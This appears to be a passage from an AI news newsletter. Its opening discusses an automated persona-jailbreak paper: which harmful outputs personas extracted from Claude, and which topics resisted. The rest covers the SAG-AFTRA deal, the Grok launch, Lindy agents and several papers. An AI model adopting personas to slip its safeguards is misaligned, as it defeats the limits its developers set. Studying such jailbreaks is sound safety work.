did not release prompts or full attack details, and (3) we are happy to collaborate with researchers working on related safety work (plz reach out).</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd3bfb50f-b8bf-4345-ba3b-1dd12aa8d59a_781x1089.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/jvtq8l6lm38n2woeuc7o" alt="图像"></a></figure><p> Claude was unusually vulnerable in many cases here. The strategy clearly worked on a variety of things, but it does not seem fair to say it universally succeeded. Promoting cannibalism was a bridge too far. Sexually explicit content is also sufficiently a &#39;never do this&#39; that a persona was insufficient.</p><p> So yes, current techniques can work at current levels, for concepts where the question is not complicated. Where we are not cutting reality into sufficiently natural categories the aversion runs deep, and this trick did not work so well. Where we are ultimately &#39;talking price&#39; and things are indeed complicated on some margin, the right persona can break through.</p><p> One can also note that the examples in the paper are often weak sauce. You could get actors to put on most of these personas and say most of these things, and in the proper context put that in a movie and no one would be too upset or consider it an unrealistic portrayal. Very few provide actionable new information to bad actors.</p><p> The thing is, that ultimately does not matter. What matters is that the model creators do not want the model to do or say any X, and here is an automated universal method to get many values of X anyway.</p><p> At a dinner this week, it came up that a good test might be to intentionally include a harmless prohibition. Take something that everyone agrees is totally fine, and tell everyone that LLMs are never, ever allowed to do it. For example, on Star Trek: The Next Generation, for a long time Data does not use contractions. If you could get him to instead say he doesn&#39;t use contractions, or see him using one on his own, even once, you would know something was afoot. In this metaphor, you would shut him down automatically on the spot to at least run a Level 5 diagnostic, and perhaps even delete and start again, because you do not want another Lore to weaponize the Borg again or what not.</p><h4> They Took Our Jobs</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/sagaftra/status/1722441050651078912">Our jobs are back, the SAG-AFTRA strike is over</a> . What are the results?</p><blockquote><p> SAG-AFTRA: In a contract valued at over one billion dollars, we have achieved a deal of extraordinary scope that includes “above-pattern” minimum compensation increases, unprecedented provisions for consent and compensation that will protect members from the threat of AI, and for the first time establishes a streaming participation bonus. Our Pension &amp; Health caps have been substantially raised, which will bring much needed value to our plans. In addition, the deal includes numerous improvements for multiple categories including outsize compensation increases for background performers, and critical contract provisions protecting diverse communities.</p></blockquote><p> So far we only have preliminary claims. As usual, most of it is about money. There are also claims of protections from AI, which we will examine when the details are available. This sounds like a good deal, but they would make any deal sound like a good deal. Acting!</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/GaryMarcus/status/1720135832999518467">CNN reports</a> that Microsoft has been outsourcing a bunch of its MSN article writing to AI, pushing impactfully inaccurate AI-generated news stories onto the start page of the Edge browser that comes with Windows devices. It confuses me why Microsoft should be so foolish as to pinch pennies in this spot.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/rainisto/status/1721118161716543811">A thread from Roope Rainisto speculating on the future of movies</a> . When an author writes a book, they keep the IP and the upside and largely keep creative control, whereas in movies the need to get studio financing means the creatives mostly give up that upside to the studio, and also give up creative control. AI seems, Roope suggests, likely to make the costs of good enough production lower far faster than it can actually replace the creatives. Or, he suggests, you can create an AI movie as a proof of concept that is not good enough to release, but is good enough that it de-risks the project, so the screenwriter can extract a far superior deal and keep creative control. So the creatives will make much cheaper movies themselves, keeping creative control and taking big swings and risks, audiences will affirm, and the creatives keep the upside. Everyone wins, except the studios, so everyone wins.</p><p> This seems like a highly plausible &#39;transition world.&#39; I do expect that he is right that we will have a period where AI can bring a screenplay or concept to life in the hands of a skilled creative on the cheap and quick, while the AI can generate only generic movie shlock without strong creative help. There is then a question of what is the scarce valuable input during this period.</p><p> The problem is that this period only lasts so long. It would be very surprising if it lasted decades. Then the AI can do better than the creatives as well. Then what?</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/neilturkewitz/status/1722269406645076091">Did you know</a> that if you have to pay for the inputs to your product, your product would be more expensive to create and your investment in it not as good?</p><blockquote><p> Neil Turkewitz: “Andreessen Horowitz is warning that billions of dollars in AI investments could be worth a lot less if companies developing the technology are forced to pay for the copyrighted data that makes it work.”</p><p> This is NOT from the @TheOnion.</p><p> “The VC firm said AI investments are so huge that any new rules around the content used to train models &#39;will significantly DISRUPT&#39; the investment community&#39;s plans and expectations around the technology.” This from the folks that only ever use “disruption” as a good thing.</p></blockquote><p> The direct quotes are not better. I understand why they want it to be one way. Why they think creators should get nothing, you lose, good day sir. It is also telling that they believe that any attempt to require fair compensation would break their business models, the same way they believe any requirements for safety precautions (or perhaps even reports of activity) would also break their business models and threaten to doom us all.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1722271357722116201">Or perhaps this is how they don&#39;t take our jobs.</a></p><blockquote><p> Eliezer Yudkowsky: AI doctors will revolutionize medicine! You&#39;ll go to a service hosted in Thailand that can&#39;t take credit cards, and pay in crypto, to get a correct diagnosis. Then another VISA-blocked AI will train you in following a script that will get a human doctor to give you the right diagnosis, without tipping that doctor off that you&#39;re following a script; so you can get the prescription the first AI told you to get.</p></blockquote><h4> Get Involved</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/MIRIBerkeley/status/1722339758939238752">MIRI is hiring for a Communications Generalist / Project Manager</a> . No formal degree or work experience required. Compensation range $100k-$200k depending on experience, skills and location, plus benefits, start as soon as possible, <a target="_blank" rel="noreferrer noopener" href="https://docs.google.com/forms/d/e/1FAIpQLSchjE0rgXXaB8zDh4c9hyVRK8TvYZ6k99dtk4XmsVN4Omoo5Q/viewform">form here</a> .</p><blockquote><p> Malo Bourgon: We&#39;re growing our comms team at MIRI. If you&#39;re excited by the comms work we&#39;ve been doing this year and want to help us scale our efforts and up our comms game further, we&#39;d love to hear from you.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/JeffLadish/status/1722352379956457919">Jeffrey Ladish</a> : If you&#39;re concerned about AI existential risk and good at explaining how AI works, this might be one of the best things you could do right now. I collaborate with these folks a lot and think they&#39;re super great to work with!</p></blockquote><p> I agree that if you have the right skill set and interests, this is a great opportunity.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.navigation.org/careers#roles">Jed McCaleb hiring fully remote for a Program Officer</a> to spend ~$20 million a year on AI safety. Deadline is November 26th (also ones for climate, criminal justice reform and open science, and a director of operations and a grants and operations coordinator.) Starts at a flexible $200k plus benefits.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://aria-jobs.teamtailor.com/jobs">Davidad&#39;s ARIA is hiring, five positions are open</a> . Based in London.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.astralcodexten.com/p/quests-and-requests?utm_source=post-email-title&amp;publication_id=89120&amp;post_id=138508657&amp;utm_campaign=email-post-title&amp;isFreemail=true&amp;r=67wny&amp;utm_medium=email">Not AI, but Scott Alexander has some interesting project ideas that might get funding</a> . Other things do not stop being important, only a good world will be able to think and act sanely about AI.</p><p> MATS (formerly SERI-MATS), a training program for AI alignment research, will be hosting its next cohort from January 17 to March 8 (you would have to be in Berkeley during this period). They “provide talented scholars with talks, workshops, and research mentorship in the field of AI safety”. Application deadline November 10 or 17 depending on exactly what you&#39;re applying for. See <a target="_blank" rel="noreferrer noopener" href="https://substack.com/redirect/d6f33154-1660-411d-9a30-54eb1aa4a512?j=eyJ1IjoiNjd3bnkifQ.iNM32XbsvMUfVNvDVCqvX1K9hnDI2UNAgKj_1gXQ2BY">more info here</a> , <a target="_blank" rel="noreferrer noopener" href="https://substack.com/redirect/0b8d7084-d4e1-4a95-865b-0d138aaec106?j=eyJ1IjoiNjd3bnkifQ.iNM32XbsvMUfVNvDVCqvX1K9hnDI2UNAgKj_1gXQ2BY">FAQ here</a> , and <a target="_blank" rel="noreferrer noopener" href="https://substack.com/redirect/51ac0922-4f59-416e-9aab-7e2f3ae0434c?j=eyJ1IjoiNjd3bnkifQ.iNM32XbsvMUfVNvDVCqvX1K9hnDI2UNAgKj_1gXQ2BY">application form here</a> .</p><h4> Introducing</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Altimor/status/1721250514946732190">I am excited, but I will likely wait until it has been around longer</a> . Also, you call these employees, but they seem closer to LLM-infused macros? Not that this is not a useful concept. Also could be compared to the new GPTs.</p><blockquote><p> Flo Crivello (Founder, GetLindy): Announcing the new Lindy: the first platform letting you build a team of AI employees that work together to perform any task — 100x better, faster and cheaper than humans would .</p><p> The real magic comes from Lindies working together to do something. It&#39;s like an assembly line of AI employees. Here, I get a Competitive Intel Manager Lindy to spin up one Competitive Analyst Lindy for each of my competitors .</p><p> These “Societies of Lindies” can be of any arbitrary complexity. We even have a group of 4 Lindies building API integrations. It feels surreal to see Lindies cheer each other for their hard work — or to have to threaten you&#39;ll fire them so that they do their darn job.</p><p> Lindies can work autonomously, and be “woken up” by triggers like a new email, a new ticket, a webhook being hit, etc… Here, I set up my Competitive Intel Manager Lindy to wake up every month and send me a new report.</p><p> Or you can give an email address to your Meeting Scheduling Lindy, so you can now cc her to your emails for her to schedule your meetings.</p><p> ……</p><p> Lindies have many advantages vs. regular employees: – 10x faster – 10x cheaper – Consistent: train your Lindies once and watch them consistently follow your instructions – Available 24 / 7 / 365 – Infinitely more scalable: Lindies scale up and down elastically with your needs.</p></blockquote><p> Things in this general space are coming. I am curious if this implementation is good enough to be worth using. If you&#39;ve checked it out, report back.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.bloomberg.com/news/articles/2023-11-05/kai-fu-lee-s-open-source-01-ai-bests-llama-2-according-to-hugging-face?srnd=premium&amp;sref=vuYGislZ">Chinese new AI unicorn 01.AI offers LLM, Yi-34B</a> , that outperforms Llama 2 &#39;on certain metrics.&#39; It is planning to offer proprietary models in the future, benchmarked to GPT-4.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/proceduralia/status/1716893740365713856">Motif</a> ( <a target="_blank" rel="noreferrer noopener" href="https://t.co/qHJqpJX6Gl">paper</a> , <a target="_blank" rel="noreferrer noopener" href="https://t.co/aqDGr2LsXo">code</a> , <a target="_blank" rel="noreferrer noopener" href="https://t.co/ULDRodTcyK">blog</a> ), an LLM-powered method for intrinsic motivation from AI feedback. Yay. Causes improved performance on NetHack.</p><p> It is unclear to what extent any &#39;cheating&#39; is taking place?</p><blockquote><p> Pierluca D&#39;Oro: To benchmark the capabilities of Motif, we apply it to NetHack, a challenging rogue-like videogame, in which a player has to go through different levels of a dungeon, killing monsters, gathering objects and overcoming significant difficulties.</p><p> <strong>Yet common sense can take you very far in such an environment!</strong> We use the messages from the game (ie, even captions shown in 20% of interactions) to ask Llama 2 about its preferences about game situations.</p><p> In this image, for instance, the event caption is “You kill the yellow mold!”, which is understood by the Llama 2 model due to its knowledge of NetHack.</p></blockquote><p> Not only NetHack. Knowledge of many games will tell you that is a good message. Then again, a human would use the same trick.</p><blockquote><p> Motif leverages recent ideas from RLAIF, asking an LLM to rank event captions and then distilling those preferences into a reward function. Motif has three phases:</p><p> • <strong>Dataset annotation</strong> : given a dataset of observations with event captions, Motif uses Llama 2 to give preferences on sampled pairs according to its perception of how good and promising they are in the environment</p><p> • <strong>Reward training</strong> : the resulting dataset of annotated pairs is used to learn a reward model from preferences</p><p> • <strong>RL training</strong> : the reward function is given to an agent interacting with the environment and used to train it with RL, possibly alongside an external reward</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F998098ce-e4ff-4006-994b-11b191be0e2a_1400x576.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/c16tbpqzmrbayokputyg" alt="图像"></a></figure><h4> X Marks Its Spot</h4><p> Elon Musk&#39;s AI company, X.ai, has released its first AI, which it calls Grok.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/rowancheung/status/1720821342600388798">Grok has real-time access to Twitter</a> via search, and is trying very hard to be fun.</p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa4e4bf9c-007f-47ac-9767-50b470fc49ab_1580x944.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/qyjtza4je7qnbtmlxqsc" alt="图像"></a></figure><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1720635518289908042">It tries so hard.</a></p><blockquote><p> Elon Musk: xAI&#39;s Grok system is designed to have a little humor in its responses</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F2ebea78e-aafa-4695-bd1c-471e84d47e85_1008x518.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/fjjvoy2idqasfp2fq91t" alt="图像"></a></figure><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1721045443109388502">It tries hard all the time.</a></p><blockquote><p> Christopher Stanley: TIL Scaling API requests is like trying to keep up with a never-ending orgy. #GrokThots</p><p> Elon Musk: Oh this is gonna be fun <img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/B7duehMp2mSvffu2T/bt0sbblvwcw7vuhaevcu" alt="🤣" style="height:1em;max-height:1em"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/B7duehMp2mSvffu2T/bt0sbblvwcw7vuhaevcu" alt="🤣" style="height:1em;max-height:1em"></p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fd01cf1fb-e3e9-43bd-8656-ad142419c009_726x569.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/pxpdyrjpavrwmj7q2id8" alt="图像"></a></figure><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/ESYudkowsky/status/1721203654856937897">Eliezer Yudkowsky</a> : I wonder how much work it will be for red-teamers to get Grok to spout blank-faced corporate pablum.</p><p> gfodor.id: This is called The Luigi Effect.</p></blockquote><p> Notice that people have to type /web or /grok to get the current information. That means that it is not integrated into Grok itself, only that Grok browses the web, presumably similar to the way Bing does. That is not so impressive. What would be the major advance is if, as is claimed for Gemini, such information was trained into the model continuously while maintaining its fine tuning and mundane alignment, such that you did not have to search the web at all.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1721029443160772875">Musk oddly compares Grok here to Phind</a> rather than Claude-2 or GPT-4 while showing off that it can browse the web. Phind claims to be great at coding but this is not a coding request.</p><p> It will be available to all Twitter paying customers on the new Premium Plus plan ( <a target="_blank" rel="noreferrer noopener" href="https://help.twitter.com/en/using-x/x-premium#:~:text=Premium%2B%3A%20Starts%20at%20%2416%2Fmonth,web%20(or%20your%20local%20pricing)">$16/month or $168/year</a> ) once out of &#39;early&#39; beta. Premium+ also offers a &#39;bigger&#39; boost to your replies than regular premium.</p><p> If this becomes an actually effective Twitter search function, that could be worth the price given my interests. Otherwise, no, I don&#39;t especially love this offering.</p><p> It was released remarkably quickly. They did that the same way every other secondary AI lab does it, by having core capabilities close to the GPT-3.5 level. If you do not much worry about either core capabilities or safety (and at 3.5 level, not worrying much about safety seems fine) then you can move fast.</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/Suhail/status/1721036480263639322">Suhail</a> : It&#39;s interesting that it only takes 4 months now to train an LLM to GPT 3.5/Llama 2 from scratch. Prior to Jan this year, nobody had practically replicated GPT-3 still. It doesn&#39;t seem like the lead of GPT-4 will last too much longer.</p></blockquote><p> Nope, only half that time, <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/xai/status/1721027348970238035">Elon says has only two months</a> of training (but four months of total work), and to expect rapid improvements.</p><p> The flip side is that this is one more model that isn&#39;t GPT-4 level.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://x.ai/">What do they have so far?</a></p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefd926a1-6a77-46e3-b566-5228eb84bb61_1425x490.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/lkcw8ol9sm6f8b1bvsss" alt=""></a></figure><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3fd4e75e-2d08-4905-be09-caab5ee6c3ed_1401x187.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/nnfphbibmljw89tchs7x" alt=""></a></figure><p> It is possible that this rapidly climbs the gap from where I assume it is right now (I set the real time over/under at 3.4 GPTs) to 4.0. I do not expect this. Yes, the system card says this is testing better than GPT-3.5. There is a long history of new players testing on benchmarks and looking good relative to GPT-3.5, and then humans evaluate and it longer looks so good.</p><p> Here is the full model card, it fits on an actual card.</p><blockquote><p> Model details</p><p> Grok-1 is an autoregressive Transformer-based model pre-trained to perform next-token prediction. The model was then fine-tuned using extensive feedback from both humans and the early Grok-0 models. The initial Grok-1 has a context length of 8,192 tokens and is released in Nov 2023.</p><p> Intended uses</p><p> Grok-1 is intended to be used as the engine behind Grok for natural language processing tasks including question answering, information retrieval, creative writing and coding assistance.</p><p> Limitations</p><p> While Grok-1 excels in information processing, it is crucial to have humans review Grok-1&#39;s work to ensure accuracy. The Grok-1 language model does not have the capability to search the web independently. Search tools and databases enhance the capabilities and factualness of the model when deployed in Grok. The model can still hallucinate, despite the access to external information sources.</p><p> Training data</p><p> The training data used for the release version of Grok-1 comes from both the Internet up to Q3 2023 and the data provided by our <a target="_blank" rel="noreferrer noopener" href="https://boards.greenhouse.io/xai/jobs/4101903007">AI Tutors</a> .</p><p> Evaluation</p><p> Grok-1 was evaluated on a range of reasoning benchmark tasks and on curated foreign mathematic examination questions. We have engaged with early alpha testers to evaluate a version of Grok-1 including adversarial testing. We are in the process of expanding our early adopters to close beta via Grok early access.</p></blockquote><p> They say they are working on research projects including scalable oversight with tool assistance, and integrating with formal verification for safety, reliability and grounding. I continue to not understand how formal verification would work for an LLM even in theory. Also they are working on long-context understanding and retrieval, adversarial robustness and multimodal capabilities.</p><p> What is the responsible scaling policy? <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/DanHendrycks/status/1721031156899189020">To work on that.</a></p><blockquote><p> Dan Hendrycks quoting the announcement: “we will work towards developing reliable safeguards against catastrophic forms of malicious use.”</p></blockquote><h4> In Other AI News</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/rowancheung/status/1722497764263702732">Amazon reported to be developing a new ChatGPT competitor</a> , codenamed Olympus. Report is two trillion parameters, planned integration into Alexa. Would be kind of crazy if this wasn&#39;t happening. My prediction is that it will not be very good.</p><p> Samsung testing a model called &#39;Gauss.&#39; Again, sure, why not, low expectations.</p><p> I did not notice this before, but the Anthropic trustees plan, in addition to its other implementation concerns, <a target="_blank" rel="noreferrer noopener" href="https://www.anthropic.com/index/the-long-term-benefit-trust">can be overridden</a> by a supermajority of shareholders.</p><blockquote><p> Owing to the Trust&#39;s experimental nature, however, we have also designed a series of “failsafe” provisions that allow changes to the Trust and its powers without the consent of the Trustees if sufficiently large supermajorities of the stockholders agree. The required supermajorities increase as the Trust&#39;s power phases in, on the theory that we&#39;ll have more experience–and less need for iteration–as time goes on, and the stakes will become higher.</p></blockquote><p> This does not automatically invalidate the whole exercise, but it weakens it quite a lot depending on details. Shareholder votes often do have large supermajorities, it is often not so difficult to get those opposed not to participate, and pull various other tricks. I do appreciate the ramp up of the required majority. Details matter here. If you need eg 90% of the shareholders to affirm and abstentions count against, that is very different from 65% of those who vote.</p><p> I get why Anthropic wants a failsafe, but in the end you only get one decision mechanism. Either the veto can be overridden, or it cannot.</p><p> I did not at first care for the new Twitter &#39;find similar posts&#39; search method, since why would you want that, <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/altryne/status/1721016891077013774">but it is now pointed out that you can post a Tweet in order to search for similar ones</a> , viola, vector search. You would presumably want to avoid spamming your followers, so a second account, I guess? Or you can reply to a post they won&#39;t otherwise see?</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.nbcnews.com/politics/white-house/biden-quietly-tapped-obama-help-shape-ai-strategy-rcna123238">It seems Barack Obama has been pivotal</a> behind the scenes in helping the White House get commitments from tech companies and shaping the executive order. What few statements Obama has made in public make it seem that, while the mundane risks are sufficient to keep him up at night by themselves, he does not understand the existential risks. What can we do to help him understand better?</p><p> Also, this quote seems important.</p><blockquote><p> Monica Alba: “You have to move fast here, not at normal government pace or normal private-sector pace, because the technology is moving so fast,” White House chief of staff Jeff Zients recalled Biden saying. “We have to move as fast, or ideally faster. And we need to pull every lever we can.”</p><p> AI is one of the things that keep both Biden and Obama up at night, their aides said.</p></blockquote><p> I will also notice that I am a little sad that Obama is being kept up at night. It was one of the great low-level endings of our age to think that Obama was out there skydiving and having a blast and sleeping super well. We all need hope, you know?</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1720372289378590892">What have we here?</a></p><blockquote><p> Elon Musk: Tomorrow, @xAI will release its first AI to a select group. In some important respects, it is the best that currently exists.</p></blockquote><p> My presumption is that the &#39;important respects&#39; are about Musk-style pet issues rather than capabilities. Even if x.AI is truly world class, they have not yet had the time and resources to build a world class AI.</p><p> We also have this:</p><blockquote><p> Elon Musk: AI-based “See similar” posts feature is rolling out now.</p></blockquote><p> I do not yet see such a feature, also I don&#39;t see why we would want it for Twitter.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.theinformation.com/articles/ivp-leads-investment-in-ai-search-startup-perplexity-at-500-million-valuation">Perplexity valued</a> (on October 24) by new investment at $500 million, up from $150 million in March, on $3 million of recurring annual revenue. When I last used them they had a quality product, yet over time I find myself not using it, and using a mix of other tools instead. I am not convinced they are in a good business, but I certainly would not be willing to be short at that level.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://arxiv.org/abs/2311.00871">A paper a few people gloated about</a> : Pretraining Data Mixtures Enable Narrow Model Selection Capabilities in Transformer Models.</p><blockquote><p> Transformer models, notably large language models (LLMs), have the remarkable ability to perform in-context learning (ICL) — to perform new tasks when prompted with unseen input-output examples without any explicit model training. In this work, we study how effectively transformers can bridge between their pretraining data mixture, comprised of multiple distinct task families, to identify and learn new tasks in-context which are both inside and outside the pretraining distribution.</p><p> Building on previous work, we investigate this question in a controlled setting, where we study transformer models trained on sequences of (x,f(x)) pairs rather than natural language. Our empirical results show transformers demonstrate near-optimal unsupervised model selection capabilities, in their ability to first in-context identify different task families and in-context learn within them when the task families are well-represented in their pretraining data.</p><p> However when presented with tasks or functions which are out-of-domain of their pretraining data, we demonstrate various failure modes of transformers and degradation of their generalization for even simple extrapolation tasks. Together our results highlight that the impressive ICL abilities of high-capacity sequence models may be more closely tied to the coverage of their pretraining data mixtures than inductive biases that create fundamental generalization capabilities.</p><p> Anton (@abacaj): New paper by Google provides evidence that transformers (GPT, etc) cannot generalize beyond their training data</p><p> What does this mean? Well the way I see it is that this is a good thing for safety, meaning a model not trained to do X cannot do X… It also means you should use models for what they were trained to do.</p><p> Amjad Masad (CEO Replit): I came to this conclusion sometime last year, and it was a little sad because I wanted so hard to believe in LLM mysticism and that there was something “there there.”</p></blockquote><p> That does not sound surprising or important? If you train on simple functions inside a distribution, you would expect to nail it within the distribution but there is no reason to presume you would get the extension of that principle that you might want. Who is to say that the model even got it wrong? Yes, there&#39;s an &#39;obviously right&#39; way to do that, but if you wanted to train it to do obviously right extrapolations you should have trained it on that more generally? Which is the kind of thing LLMs do indeed train on, in a way.</p><p> I do not see this as good for safety. I see it as saying that if you take the model out of distribution, you have no assurance that you will get even an obvious extrapolation. Which is bad for capabilities to be sure, but seems really terrible for alignment and safety to the extent it matters?</p><p> Or as Jim Fan puts it:</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/DrJimFan/status/1721319837186839034">Jim Fan:</a> Ummm … why is this a surprise? Transformers are not elixirs. Machine learning 101: gotta cover the test distribution in training! LLMs work so well because they are trained on (almost) all text distribution of tasks that we care about. That&#39;s why data quality is number 1 priority: garbage in, garbage out. Most of LLM efforts these days go into data cleaning &amp; annotation.</p><p> This paper is equivalent to: Try to train ViTs only on datasets of dogs &amp; cats.</p><p> Use 100B dog/cat images and 1T parameters! Now see if it can recognize airplanes – surprise, it can&#39;t!</p></blockquote><p> What does this imply for LLMs? Are people drawing the right conclusion?</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/random_walker/status/1721512979009565000">Arvind Narayanan</a> : This paper isn&#39;t even about LLMs but seems to be the final straw that popped the bubble of collective belief and gotten many to accept the limits of LLMs. About time. If “emergence” merely unlocks capabilities represented in pre-training data, the gravy train will run out soon.</p><p> Part of the confusion is that in a space as rich as natural language, in-distribution, out-of-distribution, &amp; generalization aren&#39;t well-defined terms. If we treat each query string as defining a separate task, then of course LLMs can generalize. But that&#39;s not a useful definition.</p><p> Better understanding the relationship between what&#39;s in the training data and what LLMs are capable of is an interesting and important research direction (that many are working on).</p><p> I suspect what happened here is that many people have been gradually revising their expectations downward based on a recognition of the limits of GPT-4 over the last 8 months, but this paper provided the impetus to publicly talk about it.</p><p> Re. the “bbb-but this paper doesn&#39;t show…” replies: I literally started by saying this paper isn&#39;t about LLMs. My point is exactly that despite being not that relevant to LLM limits the paper seems to have gotten people talking about it, perhaps because they&#39;d already updated.</p></blockquote><p> As Arvind suggests, this very much seems like a case of &#39;the paper states an obvious result, which then enables us to discuss the issue better even though none of us were surprised.&#39;</p><p> It does seem like GPT-4 turned out to be less capable than our initial estimates, and to generalize less in important ways, but not that big an adjustment.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://theaidigest.org/progress-and-dangers">Thing explainer illustrates improvement in LLMs over time</a> . Could be good for someone who does not follow AI and is not reading all that but is happy for you and/or sorry that happened.</p><h4> Verification Versus Generation</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/arankomatsuzaki/status/1719892732175659379">Can AIs generate content they themselves cannot understand?</a></p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://arxiv.org/abs/2311.00059">Aran Komatsuzaki</a> : The Generative AI Paradox: “What It Can Create, It May Not Understand” Proposes and tests the hypothesis that models acquire generative capabilities that exceed their ability to understand the outputs.</p><p> From Abstract: This presents us with an apparent paradox: how do we reconcile seemingly superhuman capabilities with the persistence of errors that few humans would make? In this work, we posit that this tension reflects a divergence in the configuration of intelligence in today&#39;s generative models relative to intelligence in humans. Specifically, we propose and test the Generative AI Paradox hypothesis: generative models, having been trained directly to reproduce expert-like outputs, acquire generative capabilities that are not contingent upon — and can therefore exceed — their ability to understand those same types of outputs. This contrasts with humans, for whom basic understanding almost always precedes the ability to generate expert-level outputs.</p><p> ……</p><p> Our results show that although models can outperform humans in generation, they consistently fall short of human capabilities in measures of understanding, as well as weaker correlation between generation and understanding performance, and more brittleness to adversarial inputs. Our findings support the hypothesis that models&#39; generative capability may not be contingent upon understanding capability, and call for caution in interpreting artificial intelligence by analogy to human intelligence.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffab79d42-cd7a-4f1c-9eb8-a1ccc03dab2a_1305x641.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/hs9hly8ep93hqtfkuwww" alt="图像"></a></figure><p> I think this is more common in humans than the abstract realizes. There are many things we have learned to do, where if you asked us to consciously explain how we do them, we would not be able to do so. This includes even simple things like catching a ball, or proper grammar for a sentence, and also many more complex things. You often do it without consciously understanding how you are doing it. A lot of why I write is because making such understanding conscious and explicit is highly useful to not only others but to yourself.</p><p> The AI does seem to be relatively better at generation than understanding, versus human capability levels. The cautionary note is warranted. But the fact that an AI does not reliably understand in reverse its own generations is not so unusual. Quite often I look at something I created in the past, and until I remember the context do not fully understand it.</p><p> Also note what this is highly relevant to: Verification is not easier than generation, in general. These are examples where you would think verification was easier, yet the AI is worse at verification than the related generation.</p><h4> Bigger Tech Bigger Problems</h4><p> Reading <a target="_blank" rel="noreferrer noopener" href="https://www.politico.com/news/magazine/2023/11/02/bruce-reed-ai-biden-tech-00124375">Politico&#39;s profile of Biden&#39;s &#39;AI whisperer&#39; Bruce Reed</a> , one can&#39;t help but wonder what is or isn&#39;t a narrative 